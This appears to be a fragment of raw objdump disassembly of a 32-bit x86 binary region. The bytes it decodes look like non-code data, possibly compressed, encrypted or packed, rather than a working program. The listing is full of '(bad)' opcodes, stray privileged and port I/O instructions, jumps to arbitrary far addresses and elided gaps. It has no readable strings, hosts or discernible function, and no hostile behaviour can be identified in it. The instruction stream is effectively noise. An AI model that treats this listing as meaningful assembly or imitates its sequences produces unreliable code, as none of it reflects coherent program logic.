  428f32:	rcl    BYTE PTR [eax],0x6f
  428f35:	or     ecx,DWORD PTR [ebx+0x39]
  428f38:	data16 sbb BYTE PTR ss:[eax+eax*1-0x1],bl
  428f3e:	xor    ebx,esp
  428f40:	ror    BYTE PTR [edi+0xa65a4d0],1
  428f46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f47:	leave  
  428f48:	sahf   
  428f49:	(bad)
  428f4c:	mov    edx,0x51939ffe
  428f51:	fwait
  428f52:	repz xchg ah,bh
  428f55:	xchg   DWORD PTR [ebx],ecx
  428f57:	push   ebp
  428f58:	outs   dx,BYTE PTR ds:[esi]
  428f59:	arpl   WORD PTR [edi],bx
  428f5b:	push   ecx
  428f5c:	xor    eax,0xd0b6fd86
  428f61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f62:	jmp    0x428f19
  428f64:	mov    eax,ds:0x939b2829
  428f69:	ds sub bl,ch
  428f6c:	(bad)  
  428f6d:	out    dx,al
  428f6e:	xchg   ecx,eax
  428f6f:	inc    eax
  428f70:	enter  0xf2bc,0xcf
  428f74:	pop    esi
  428f75:	mov    ch,0xeb
  428f77:	dec    edx
  428f78:	ficomp WORD PTR [edi-0x57]
  428f7b:	cli    
  428f7c:	xor    ebp,DWORD PTR [edx]
  428f7e:	sub    al,0x36
  428f80:	jo     0x428f31
  428f82:	mov    DWORD PTR [eax+0x26],ecx
  428f85:	sub    cl,ah
  428f87:	jmp    0x5467a906
  428f8c:	mov    ah,0xb1
  428f8e:	pop    ss
  428f8f:	sub    BYTE PTR ds:0x68dc336e,al
  428f95:	mov    dl,0x1d
  428f97:	(bad)  
  428f99:	(bad)  
  428f9a:	in     al,dx
  428f9b:	dec    ebx
  428f9c:	dec    esp
  428f9d:	scas   eax,DWORD PTR es:[edi]
  428f9e:	loop   0x428f8d
  428fa0:	or     ebx,DWORD PTR [esi]
  428fa2:	cdq    
  428fa3:	cld    
  428fa4:	adc    al,BYTE PTR [ebp+0x5102dca9]
  428faa:	js     0x428fe3
  428fac:	push   edx
  428fad:	xchg   ebx,eax
  428fae:	or     eax,0x90252fa7
  428fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fb4:	sti    
	...
  429015:	add    cl,ah
  429017:	in     al,dx
  429018:	mov    ebx,es
  42901a:	(bad)  
  42901b:	jecxz  0x42900c
  42901d:	out    dx,al
  42901e:	arpl   WORD PTR [esi+0x79],cx
  429021:	sbb    DWORD PTR [edi],ebx
  429023:	retf   
  429024:	add    edi,DWORD PTR [edi+0x14]
  429027:	mov    dh,0x1
  429029:	add    BYTE PTR [edi],al
  42902b:	add    DWORD PTR [eax],eax
  42902d:	add    dl,dh
  42902f:	das    
  429030:	mov    dl,0x90
  429032:	rol    dh,0x70
  429035:	ds jmp 0x648521cb
  42903b:	and    eax,DWORD PTR [ecx-0x8]
  42903e:	aad    0xe3
  429040:	dec    ebp
  429041:	push   eax
  429042:	mov    BYTE PTR [esi-0x6423a46],bl
  429048:	popf   
  429049:	pop    ebx
  42904a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42904b:	pop    eax
  42904c:	ins    BYTE PTR es:[edi],dx
  42904d:	push   ebp
  42904e:	lods   al,BYTE PTR ds:[esi]
  42904f:	leave  
  429050:	cmp    ecx,DWORD PTR [ebp+ebx*8-0x3c7feb6f]
  429057:	lock test BYTE PTR [edi],ch
  42905a:	pop    es
  42905b:	sbb    DWORD PTR [eax+esi*2-0x5c5babbe],esp
  429062:	xchg   edi,eax
  429063:	aad    0xda
  429065:	cwde   
  429066:	cmp    eax,DWORD PTR [eax-0x2c4e122b]
  42906c:	xchg   ebp,eax
  42906d:	repz jo 0x4290b6
  429070:	iret   
  429071:	xlat   BYTE PTR ds:[ebx]
  429072:	dec    eax
  429073:	add    DWORD PTR [bx+di],esi
  429076:	out    dx,al
  429077:	repz sbb al,0x70
  42907a:	int    0xd5
  42907c:	das    
  42907d:	test   al,0x6a
  42907f:	shl    eax,1
  429081:	pop    ebx
  429082:	pusha  
  429083:	stc    
  429084:	dec    eax
  429085:	xchg   DWORD PTR [ebp-0x608a0826],eax
  42908b:	sub    edi,ecx
  42908d:	ds mov ecx,0x74ce1d2
  429093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429094:	clc    
  429095:	jne    0x429065
  429097:	sbb    ecx,DWORD PTR [ebx]
  429099:	fstp   QWORD PTR [edx]
  42909b:	loop   0x429062
  42909d:	pop    ds
  42909e:	sar    DWORD PTR [edx],1
  4290a0:	xor    al,ah
  4290a2:	inc    edx
  4290a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290a4:	je     0x429072
  4290a6:	mov    ds:0x97c845ff,al
  4290ab:	ret    0x80b5
  4290ae:	js     0x429038
  4290b0:	ret    
  4290b1:	xchg   edi,eax
  4290b2:	loop   0x4290c7
  4290b4:	xchg   ebx,eax
  4290b5:	pop    ss
  4290b6:	sub    al,0x87
  4290b8:	dec    ecx
  4290b9:	sbb    BYTE PTR [ebx+0x5540ce73],cl
  4290bf:	(bad)  
  4290c0:	fisubr DWORD PTR [esi-0x75551da9]
  4290c6:	xchg   ebx,eax
  4290c7:	dec    edi
  4290c8:	or     eax,0xd1cad28f
  4290cd:	rcl    BYTE PTR [ebx],0x6f
  4290d0:	and    bh,BYTE PTR [edx-0x760e4a95]
  4290d6:	sbb    BYTE PTR [edx+esi*2+0x3af621a2],dh
  4290dd:	(bad)  
  4290de:	cli    
  4290df:	xchg   esp,eax
  4290e0:	ja     0x4290e0
  4290e2:	adc    ecx,ecx
  4290e4:	ss enter 0x9f61,0xd3
  4290e9:	dec    esi
  4290ea:	not    DWORD PTR [ebp-0x17]
  4290ed:	jo     0x4290f8
  4290ef:	dec    esi
  4290f0:	sub    ebx,edx
  4290f2:	mov    WORD PTR ds:0x2d14fbb4,?
  4290f8:	sbb    eax,0x1cd51b13
  4290fd:	pop    edx
  4290fe:	lahf   
  4290ff:	inc    eax
  429100:	rol    esp,0xdf
  429103:	cli    
  429104:	shr    BYTE PTR [ebx],1
  429106:	iret   
  429107:	and    al,0xc7
  429109:	lods   eax,DWORD PTR ds:[esi]
  42910a:	mov    cl,0xad
  42910c:	cmc    
  42910d:	sbb    eax,0x8cf939c0
  429112:	(bad)  
  429113:	test   eax,0x118076f1
  429118:	sbb    bl,BYTE PTR [eax]
  42911a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42911b:	dec    eax
  42911c:	jae    0x429152
  42911e:	sbb    DWORD PTR [edi-0x6a0525d7],esp
  429124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429125:	call   0xaa47eda4
  42912a:	add    BYTE PTR [edx],cl
  42912c:	or     DWORD PTR gs:[eax],edi
  42912f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429131:	(bad)  [edx-0x7c]
  429134:	aad    0x0
	...
  429196:	push   esi
  429197:	xchg   ebp,edi
  429199:	test   ch,bh
  42919b:	(bad)  
  42919c:	jg     0x429175
  42919e:	xor    dh,0xd6
  4291a1:	stos   DWORD PTR es:[edi],eax
  4291a2:	ja     0x4291dd
  4291a4:	in     al,dx
  4291a5:	dec    esp
  4291a6:	sbb    esi,DWORD PTR [edi+0x1070001]
  4291ac:	add    BYTE PTR [eax],al
  4291ae:	push   ebp
  4291af:	(bad)
  4291b3:	xlat   BYTE PTR ds:[ebx]
  4291b4:	and    al,0x60
  4291b6:	jne    0x42917a
  4291b8:	sub    eax,0x2391fe53
  4291bd:	xor    ebx,DWORD PTR [ebx+0x7]
  4291c0:	fdecstp 
  4291c2:	push   esi
  4291c3:	or     esp,DWORD PTR [edi+edx*1+0x3a]
  4291c7:	outs   dx,BYTE PTR ds:[esi]
  4291c8:	loope  0x42923c
  4291ca:	test   eax,0xff823d88
  4291cf:	out    0x68,al
  4291d1:	mov    ds:0xcbd44b25,al
  4291d6:	fcomp  st(5)
  4291d8:	pushf  
  4291d9:	mov    eax,DWORD PTR [edi]
  4291db:	test   DWORD PTR [ecx-0xd],ebx
  4291de:	mul    DWORD PTR [edx-0xa]
  4291e1:	or     al,0x9f
  4291e3:	mov    esi,0x682f0061
  4291e8:	arpl   WORD PTR [edx-0x32e3ccc4],di
  4291ee:	add    al,0xb5
  4291f0:	push   ss
  4291f1:	mov    eax,0x77a593a5
  4291f6:	inc    esi
  4291f7:	js     0x42923a
  4291f9:	mov    DWORD PTR [edi+0x16ded3c4],esi
  4291ff:	and    eax,0xa093d645
  429204:	inc    ebp
  429205:	mov    ch,0xb5
  429207:	pusha  
  429208:	stc    
  429209:	pop    ss
  42920a:	jge    0x429277
  42920c:	in     al,0x45
  42920e:	cld    
  42920f:	or     DWORD PTR [ebp+0x4f],edi
  429212:	mov    ch,0x22
  429214:	stos   DWORD PTR es:[edi],eax
  429215:	xchg   esp,eax
  429216:	xor    al,0xd1
  429218:	dec    ecx
  429219:	loop   0x429260
  42921b:	push   0xf6beb28b
  429220:	mov    ?,WORD PTR [ebp-0x780f0c4c]
  429226:	aaa    
  429227:	std    
  429228:	inc    ebp
  429229:	jmp    0x4291ea
  42922b:	mov    dl,0xd2
  42922d:	dec    eax
  42922e:	jle    0x4291d8
  429230:	push   edi
  429231:	imul   ecx,DWORD PTR [ebp+0x1c04561f],0xffffffe7
  429238:	les    ecx,FWORD PTR [ecx]
  42923a:	dec    ebx
  42923b:	dec    esp
  42923c:	lock loop 0x429235
  42923f:	dec    BYTE PTR [ebx+0x59835c74]
  429245:	stos   BYTE PTR es:[edi],al
  429246:	pop    edx
  429247:	(bad)  
  429248:	pushf  
  429249:	pop    ecx
  42924a:	jle    0x4292a7
  42924c:	mov    edx,0xeb5dd382
  429251:	out    dx,eax
  429252:	push   ecx
  429253:	popa   
  429254:	mov    ecx,0xd523036a
  429259:	loopne 0x429202
  42925b:	pop    ecx
  42925c:	(bad)  
  42925e:	ins    BYTE PTR es:[edi],dx
  42925f:	stos   BYTE PTR es:[edi],al
  429260:	cmp    ch,BYTE PTR [esp+eiz*4-0x60d0c614]
  429267:	adc    DWORD PTR [ebx-0x54],ebp
  42926a:	add    al,dh
  42926c:	test   BYTE PTR [ecx+eax*1],ch
  42926f:	xchg   esi,eax
  429270:	add    al,0xdb
  429272:	add    bl,BYTE PTR [esp+ebp*2+0x14]
  429276:	adc    ch,ch
  429278:	fst    QWORD PTR [ebx-0x174c898]
  42927e:	dec    edx
  42927f:	stos   BYTE PTR es:[edi],al
  429280:	and    BYTE PTR [ebx+ebx*8-0x38fddc4f],0x9
  429288:	out    0x15,al
  42928a:	inc    ebx
  42928b:	push   edx
  42928c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42928d:	imul   ebp,esp,0xffffffc5
  429290:	not    bh
  429292:	lea    eax,[edi]
  429294:	scas   al,BYTE PTR es:[edi]
  429295:	push   0xdf14f0b0
  42929a:	pop    ds
  42929b:	dec    ecx
  42929c:	push   cs
  42929d:	iret   
  42929e:	call   0x6bb882fd
  4292a3:	fcomp  DWORD PTR [eax-0x2a]
  4292a6:	out    0xb3,eax
  4292a8:	adc    DWORD PTR [edx+0x78],edi
  4292ab:	push   ds
  4292ac:	inc    esp
  4292ad:	adc    BYTE PTR [esp+eax*8],dl
  4292b0:	sbb    eax,0xdfa7b417
	...
  429315:	add    al,dh
  429317:	adc    al,0xe1
  429319:	(bad)  
  42931a:	in     eax,0xff
  42931c:	call   FWORD PTR [esi]
  42931e:	xor    cl,BYTE PTR [ebx-0xc]
  429321:	fs pop ss
  429323:	or     eax,DWORD PTR [ebx]
  429325:	push   ebx
  429326:	and    bh,BYTE PTR [eax+0x1070001]
  42932c:	add    BYTE PTR [eax],al
  42932e:	hlt    
  42932f:	pop    esp
  429330:	pop    edx
  429331:	sbb    DWORD PTR [esi-0x2],0xffffffbe
  429335:	scas   eax,DWORD PTR es:[edi]
  429336:	imul   edx,DWORD PTR [esi+0x2e8b29c7],0xb5fea455
  429340:	sahf   
  429341:	daa    
  429342:	xchg   ebp,eax
  429343:	dec    ebx
  429344:	int3   
  429345:	and    al,0xcb
  429347:	sahf   
  429348:	test   al,0x8c
  42934a:	pusha  
  42934b:	xor    BYTE PTR [edi],ah
  42934d:	addr16 pop ecx
  42934f:	pop    esp
  429350:	adc    eax,0xcd309a10
  429355:	hlt    
  429356:	cmp    eax,0xf07f7dbf
  42935b:	push   eax
  42935c:	mov    eax,0x592e864a
  429361:	gs test eax,0x791db10a
  429367:	sar    DWORD PTR ds:0x5782770c,1
  42936d:	inc    esp
  42936e:	fdivr  DWORD PTR ds:0xd52da114
  429374:	rol    DWORD PTR [eax+edi*1-0x62],0xf4
  429379:	jl     0x42935f
  42937b:	pop    ds
  42937c:	aaa    
  42937d:	pop    edi
  42937e:	loope  0x4293a5
  429380:	mov    dl,0x8
  429382:	ret    
  429383:	or     esi,ecx
  429385:	into   
  429386:	sbb    eax,0xdbeebc1e
  42938b:	pop    eax
  42938c:	leave  
  42938d:	sbb    BYTE PTR [eax+0x17],bh
  429390:	ins    BYTE PTR es:[edi],dx
  429391:	push   ss
  429392:	adc    dl,dh
  429394:	(bad)  
  429395:	pop    ecx
  429396:	fistp  DWORD PTR [eax]
  429398:	test   BYTE PTR [ebx+eax*8],0x7
  42939c:	sbb    al,0x62
  42939e:	xchg   esi,eax
  42939f:	adc    eax,0xd03484b1
  4293a4:	inc    esp
  4293a5:	test   BYTE PTR [esi],dh
  4293a7:	lods   al,BYTE PTR ds:[esi]
  4293a8:	add    BYTE PTR [edi],al
  4293aa:	xsavec ds:0x102b9332
  4293b1:	fld    DWORD PTR [eax-0x3]
  4293b4:	jecxz  0x429390
  4293b6:	and    DWORD PTR [ebp-0x52043755],edi
  4293bc:	(bad)  
  4293bd:	jecxz  0x429424
  4293bf:	adc    esp,ebx
  4293c1:	int3   
  4293c2:	mov    dl,0xad
  4293c4:	xor    al,0x2a
  4293c6:	js     0x5ee755c6
  4293cc:	test   al,0x94
  4293ce:	fistp  WORD PTR ds:0x5b45306a
  4293d4:	loope  0x4293a5
  4293d6:	sbb    al,0xa4
  4293d8:	push   edi
  4293d9:	mov    dl,0x50
  4293db:	jmp    0x4293d7
  4293dd:	mov    ebp,0xb915d225
  4293e2:	(bad)  
  4293e3:	fcmovnu st,st(4)
  4293e5:	xchg   ebp,eax
  4293e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4293e7:	pop    es
  4293e8:	out    dx,eax
  4293e9:	neg    BYTE PTR [edi-0x36]
  4293ec:	fidivr DWORD PTR [edi]
  4293ee:	(bad)  
  4293f0:	fisub  WORD PTR [edx+0x6adc20fe]
  4293f6:	fistp  DWORD PTR [edx]
  4293f8:	aam    0x8f
  4293fa:	pop    edx
  4293fb:	outs   dx,BYTE PTR ds:[esi]
  4293fc:	sbb    al,bl
  4293fe:	js     0x42944d
  429400:	aad    0xdf
  429402:	retf   0xcf14
  429405:	xchg   BYTE PTR [ebx-0x67],ah
  429408:	std    
  429409:	xor    esi,DWORD PTR [eax+0x1309d58b]
  42940f:	push   cs
  429410:	pop    ebx
  429411:	pusha  
  429412:	aad    0x46
  429414:	pop    eax
  429415:	mov    edi,DWORD PTR [ecx+0x69]
  429418:	inc    ecx
  429419:	and    dl,cl
  42941b:	mov    bl,0xe3
  42941d:	and    DWORD PTR [edx],ebx
  42941f:	pop    ecx
  429420:	das    
  429421:	jl     0x4293ba
  429423:	ins    DWORD PTR es:[edi],dx
  429424:	inc    esi
  429425:	mov    dh,0xd8
  429427:	daa    
  429428:	pop    ebp
  429429:	ja     0x42945e
  42942b:	outs   dx,BYTE PTR ds:[esi]
  42942c:	sahf   
  42942d:	(bad)  
  42942e:	sbb    DWORD PTR [ecx-0x1],edx
  429431:	sub    al,0xe5
  429433:	or     BYTE PTR [eax],ch
	...
  429495:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  429499:	sub    al,0x53
  42949b:	ds jg  0x42950b
  42949e:	adc    al,0xa9
  4294a0:	outs   dx,DWORD PTR ds:[esi]
  4294a1:	xlat   BYTE PTR ds:[ebx]
  4294a2:	cmp    al,0xd9
  4294a4:	add    BYTE PTR ds:0x1b929,al
  4294aa:	pop    es
  4294ab:	add    DWORD PTR [eax],eax
  4294ad:	add    BYTE PTR [edi+edx*2+0x4b],cl
  4294b1:	sti    
  4294b2:	test   al,0x56
  4294b4:	mov    edx,0x2944f2b7
  4294b9:	or     ebp,DWORD PTR [ecx]
  4294bb:	xor    dh,ch
  4294bd:	pop    edx
  4294be:	mov    ebp,0xdced9e39
  4294c3:	es fcmovnu st,st(4)
  4294c6:	cmp    eax,edx
  4294c8:	fucom  st(7)
  4294ca:	inc    ebp
  4294cb:	inc    esi
  4294cc:	clc    
  4294cd:	pop    eax
  4294ce:	sub    ch,BYTE PTR [esi+0x3b]
  4294d1:	xchg   edx,eax
  4294d2:	pop    esi
  4294d3:	pop    ds
  4294d4:	pop    ds
  4294d5:	pop    es
  4294d6:	retf   0xe9c5
  4294d9:	mov    al,0x35
  4294db:	fadd   QWORD PTR [ebx]
  4294dd:	call   0x49f37c5e
  4294e2:	fs dec edx
  4294e4:	imul   edi,DWORD PTR [edi+ebx*1-0x1d],0xffffffec
  4294e9:	xchg   DWORD PTR ds:0x45bbc130,ebx
  4294ef:	ror    DWORD PTR [edi+0x63],cl
  4294f2:	push   ss
  4294f3:	add    bh,ah
  4294f5:	cmp    DWORD PTR [ebx-0x2f],ebx
  4294f8:	out    0x2c,al
  4294fa:	sub    DWORD PTR [ebx],edx
  4294fc:	sahf   
  4294fd:	push   edx
  4294fe:	into   
  4294ff:	icebp  
  429500:	push   ss
  429501:	jne    0x42950e
  429503:	push   ds
  429504:	push   0x69e84434
  429509:	mov    ds:0xd17ff463,al
  42950e:	jnp    0x429518
  429510:	(bad)  
  429512:	mov    ch,0xbd
  429514:	ja     0x429587
  429516:	push   ebx
  429517:	pop    esi
  429518:	inc    esp
  429519:	pop    eax
  42951a:	cmc    
  42951b:	cs push es
  42951d:	push   edx
  42951e:	adc    ebx,esp
  429520:	arpl   WORD PTR [ecx+0x56],cx
  429523:	sbb    edx,ebp
  429525:	daa    
  429526:	out    0x26,eax
  429528:	jno    0x429524
  42952a:	xor    DWORD PTR ds:0xbb143c24,0xe619d2c9
  429534:	inc    edx
  429535:	jl     0x429584
  429537:	and    eax,0x41373d2f
  42953c:	sbb    DWORD PTR [ebp+0x7f],0x13d67fe5
  429543:	and    edi,esi
  429545:	inc    edx
  429546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429548:	jg     0x4294db
  42954a:	or     bl,al
  42954c:	jmp    0x8cca:0x2978fc46
  429553:	pop    ebp
  429554:	pop    esp
  429555:	or     ecx,DWORD PTR ds:[ebx-0x23]
  429559:	cld    
  42955a:	fcmove st,st(2)
  42955c:	adc    eax,0x39a9454d
  429561:	mov    eax,0xe5bb4a22
  429566:	call   0x4db5:0xc3fc4b2b
  42956d:	sbb    edx,0x2070e2f
  429573:	xor    ecx,DWORD PTR [ecx+0x7f]
  429576:	fimul  DWORD PTR [ecx]
  429578:	out    0x2d,al
  42957a:	fisttp QWORD PTR [ecx]
  42957c:	int    0xda
  42957e:	outs   dx,DWORD PTR ds:[esi]
  42957f:	pop    esp
  429580:	push   ss
  429581:	xchg   edi,edi
  429583:	test   DWORD PTR [ebx-0x6d],edi
  429586:	sti    
  429587:	mov    ebp,0x86126d0a
  42958c:	or     DWORD PTR [edx-0x1b24bb3d],ebx
  429592:	inc    eax
  429593:	mov    ds:0xd15f6dc4,eax
  429598:	pop    ebp
  429599:	lods   al,BYTE PTR cs:[esi]
  42959b:	jl     0x4295f8
  42959d:	fstp   TBYTE PTR [edx]
  42959f:	jle    0x429558
  4295a1:	ds clc 
  4295a3:	pop    eax
  4295a4:	ins    DWORD PTR es:[edi],dx
  4295a5:	adc    DWORD PTR [ecx],ebx
  4295a7:	mov    BYTE PTR [ecx+0x23],al
  4295aa:	adc    DWORD PTR [esi-0x2b],ecx
  4295ad:	jbe    0x429617
  4295af:	pop    ds
  4295b0:	push   0x21cd29d9
	...
  429615:	add    BYTE PTR [ebp+0x1d],ch
  429618:	out    0xc0,al
  42961a:	idiv   bl
  42961c:	outs   dx,DWORD PTR ds:[esi]
  42961d:	mov    ebp,0x8523ba9d
  429622:	sbb    BYTE PTR [edx-0x15],ch
  429625:	push   esp
  429626:	xor    BYTE PTR [edx+0x1070001],bh
  42962c:	add    BYTE PTR [eax],al
  42962e:	push   eax
  42962f:	loop   0x429667
  429631:	add    DWORD PTR [ecx+0x31e74faf],ecx
  429637:	mov    ebx,0x84dfee06
  42963c:	lds    esi,FWORD PTR [ebp-0x72]
  42963f:	into   
  429640:	pusha  
  429641:	mov    dh,0xe3
  429643:	addr16 call 0xc200:0x507318d2
  42964b:	adc    eax,0xd45e88e8
  429650:	in     eax,0x63
  429652:	and    BYTE PTR [ebx],cl
  429654:	leave  
  429655:	jg     0x429611
  429657:	retf   
  429658:	push   ebx
  429659:	or     ebp,edi
  42965b:	les    ebp,FWORD PTR [edx-0x6d79136f]
  429661:	mov    ebp,0xaf3a8361
  429666:	ret    
  429667:	push   ss
  429668:	cld    
  429669:	inc    ecx
  42966a:	inc    esp
  42966b:	lock jne 0x429615
  42966e:	push   ecx
  42966f:	jnp    0x4296b9
  429671:	pop    es
  429672:	and    bh,BYTE PTR [ebp+0x3f]
  429675:	cli    
  429676:	test   al,0xff
  429678:	xchg   ecx,eax
  429679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42967a:	punpckhdq mm3,QWORD PTR [esi+0x53]
  42967e:	out    dx,eax
  42967f:	jae    0x429645
  429681:	sbb    dl,BYTE PTR [ebx-0x80]
  429684:	push   ebp
  429685:	ss stos DWORD PTR es:[edi],eax
  429687:	mov    dh,0x95
  429689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42968a:	inc    edx
  42968b:	dec    ecx
  42968c:	mov    edi,DWORD PTR [ecx]
  42968e:	outs   dx,DWORD PTR ds:[esi]
  42968f:	and    DWORD PTR [ecx+0x37816145],0x4
  429696:	js     0x4296c6
  429698:	pop    eax
  429699:	cmp    eax,0xfce8d82b
  42969e:	rcr    BYTE PTR [edi+eax*1-0x200b4983],1
  4296a5:	sub    ah,ch
  4296a7:	pusha  
  4296a8:	and    al,0x17
  4296aa:	inc    esi
  4296ab:	lea    edi,[ecx+ebx*1+0x7e16e979]
  4296b2:	dec    ebx
  4296b3:	mov    DWORD PTR [ebp+0x50],esi
  4296b6:	ja     0x4296d1
  4296b8:	fs pop ebp
  4296ba:	outs   dx,BYTE PTR ds:[esi]
  4296bb:	xor    al,0x63
  4296bd:	popa   
  4296be:	div    BYTE PTR [ebp+0x44]
  4296c1:	data16 sbb cl,BYTE PTR [esi]
  4296c4:	out    dx,al
  4296c5:	adc    DWORD PTR [ecx+0x22],ebx
  4296c8:	ins    BYTE PTR es:[edi],dx
  4296c9:	rcr    BYTE PTR [esi-0xefc2632],0x5c
  4296d0:	push   0xe35ef58c
  4296d5:	pop    ebx
  4296d6:	les    ebx,FWORD PTR [edx-0x4fe267b0]
  4296dc:	fld    TBYTE PTR [ebx+edi*2+0x53bfd4b3]
  4296e3:	add    al,0x68
  4296e5:	push   edx
  4296e6:	push   cs
  4296e7:	xor    DWORD PTR [edi],esp
  4296e9:	xor    al,0xcd
  4296eb:	popa   
  4296ec:	in     al,dx
  4296ed:	neg    cl
  4296ef:	stc    
  4296f0:	call   0x2e0a:0x2eb670ae
  4296f7:	and    eax,0x30277110
  4296fc:	mov    ds:0x8ed2a0e6,al
  429701:	cmp    eax,0xd4bab058
  429706:	jl     0x429708
  429708:	mov    esi,0xe56085c4
  42970d:	jne    0x4296dc
  42970f:	int3   
  429710:	aas    
  429711:	test   al,0x61
  429713:	stos   BYTE PTR es:[edi],al
  429714:	sahf   
  429715:	mov    edx,0xb43edcdd
  42971a:	cli    
  42971b:	jnp    0x42971c
  42971d:	inc    esp
  42971e:	outs   dx,DWORD PTR ds:[esi]
  42971f:	pop    ecx
  429720:	mov    eax,ds:0x1eff5560
  429725:	popf   
  429726:	mov    ebx,DWORD PTR [ebx+0x6d024a38]
  42972c:	push   esp
  42972d:	ret    0x593
  429730:	cmp    al,0xfb
  429732:	repnz sbb ebp,esi
	...
  429795:	add    BYTE PTR [eax],dh
  429797:	inc    edx
  429798:	fbld   TBYTE PTR [edx-0x1]
  42979b:	(bad)  
  42979c:	mov    ebp,0x1396252
  4297a1:	(bad)  
  4297a3:	ret    
  4297a4:	mov    ch,0x11
  4297a6:	aaa    
  4297a7:	mov    ebx,0x1070001
  4297ac:	add    BYTE PTR [eax],al
  4297ae:	fdiv   DWORD PTR [ecx-0x7d]
  4297b1:	cs jb  0x429746
  4297b4:	inc    ebp
  4297b5:	inc    esp
  4297b6:	test   BYTE PTR [edi],bl
  4297b8:	fdivr  QWORD PTR [ecx+0x5]
  4297bb:	out    dx,al
  4297bc:	dec    esp
  4297bd:	imul   edx,DWORD PTR [ebx+0x5a8703bb],0xd59cc850
  4297c7:	out    dx,al
  4297c8:	push   eax
  4297c9:	dec    ebx
  4297ca:	cmp    ah,BYTE PTR [ebp+ebx*8-0x70]
  4297ce:	dec    ecx
  4297cf:	scas   eax,DWORD PTR es:[edi]
  4297d0:	das    
  4297d1:	test   al,0xe9
  4297d3:	(bad)  
  4297d4:	sbb    ebx,DWORD PTR [edx-0xd]
  4297d7:	test   eax,0xbab2d89b
  4297dc:	sub    edx,ebp
  4297de:	(bad)  
  4297df:	clc    
  4297e0:	cmc    
  4297e1:	fs push esp
  4297e3:	call   0xce3e:0x64ac72cb
  4297ea:	fs push cs
  4297ec:	pop    ebx
  4297ed:	in     eax,0x9d
  4297ef:	xchg   esi,eax
  4297f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4297f1:	lods   eax,DWORD PTR ds:[esi]
  4297f2:	fstp   DWORD PTR [edi+ebx*1+0x50d2e3a7]
  4297f9:	sbb    bh,BYTE PTR [ecx-0x7236721e]
  4297ff:	cmc    
  429800:	outs   dx,BYTE PTR ds:[esi]
  429801:	push   edx
  429802:	mov    ecx,0xb587347c
  429807:	idiv   BYTE PTR [esi+edi*8-0x69]
  42980b:	adc    dh,BYTE PTR [esi+edi*4-0x3]
  42980f:	jmp    0xbb12:0x9c7befba
  429816:	add    DWORD PTR [eax],ebx
  429818:	xchg   esi,eax
  429819:	stc    
  42981a:	jmp    DWORD PTR [ecx]
  42981c:	lods   eax,DWORD PTR ds:[esi]
  42981d:	xchg   ebx,eax
  42981e:	shl    BYTE PTR [edi+0x1abab4cd],0xfc
  429825:	adc    BYTE PTR [ebx-0x469f59be],dl
  42982b:	jg     0x429829
  42982d:	sub    ah,BYTE PTR [eax+0x38888760]
  429833:	or     ah,bl
  429835:	test   esp,esp
  429837:	leave  
  429838:	popf   
  429839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42983a:	push   ds
  42983b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42983c:	mov    dl,BYTE PTR [ebp+0x3b965696]
  429842:	loope  0x429810
  429844:	mov    DWORD PTR [ebx+0x51],eax
  429847:	mov    eax,0x6ce46f2f
  42984c:	mov    ds:0x91599d25,eax
  429851:	sub    DWORD PTR [ecx-0x69],ebp
  429854:	pop    eax
  429855:	popf   
  429856:	(bad)  
  429858:	sub    BYTE PTR [edx+0x4],al
  42985b:	pop    ebx
  42985c:	or     BYTE PTR [edi+0x5],cl
  42985f:	std    
  429860:	pop    edi
  429861:	scas   eax,DWORD PTR es:[edi]
  429862:	repnz sar DWORD PTR [eax],cl
  429865:	pop    edx
  429866:	push   ebp
  429867:	mul    BYTE PTR [eax+0x75013747]
  42986d:	adc    DWORD PTR [edx+0x2a],eax
  429870:	rcr    BYTE PTR [edx+0x62],1
  429873:	pop    ebx
  429874:	jecxz  0x4298ee
  429876:	push   esi
  429877:	mov    ebp,0x27e98a6f
  42987c:	xchg   DWORD PTR [esi+eiz*1-0x6a],edi
  429880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429881:	dec    ebx
  429882:	imul   ecx,ebp,0x179ca7e4
  429888:	and    cl,BYTE PTR [edx+0x775b513b]
  42988e:	jecxz  0x4298f8
  429890:	out    dx,eax
  429891:	adc    DWORD PTR [ecx],esp
  429893:	sbb    BYTE PTR [edx-0x54],bh
  429896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429897:	xor    BYTE PTR [eax],al
  429899:	and    edx,DWORD PTR [eax-0x29d30050]
  42989f:	fimul  WORD PTR [edx+eax*8-0x6]
  4298a3:	push   0xffffff87
  4298a5:	ror    DWORD PTR [edi+0x7c],1
  4298a8:	pop    edi
  4298a9:	cmp    edi,esp
  4298ab:	stos   BYTE PTR es:[edi],al
  4298ac:	or     BYTE PTR [eax-0x6020a82a],dl
  4298b2:	stos   DWORD PTR es:[edi],eax
  4298b3:	aad    0x2f
	...
  429915:	add    BYTE PTR [edi+0x68],dl
  429918:	fistp  QWORD PTR fs:[edi-0x21]
  42991c:	(bad)  
  42991d:	call   0x449747d3
  429922:	mov    ebx,0x3ef260b8
  429927:	mov    esp,0x1070001
  42992c:	add    BYTE PTR [eax],al
  42992e:	sub    eax,0xa26139ba
  429933:	or     DWORD PTR [edi],edi
  429935:	sub    al,0x65
  429937:	jbe    0x42998c
  429939:	xor    DWORD PTR [esi+0x40],0xe897f119
  429940:	mov    dl,0x40
  429942:	jo     0x429909
  429944:	mov    eax,ds:0x22bbc89b
  429949:	cdq    
  42994a:	into   
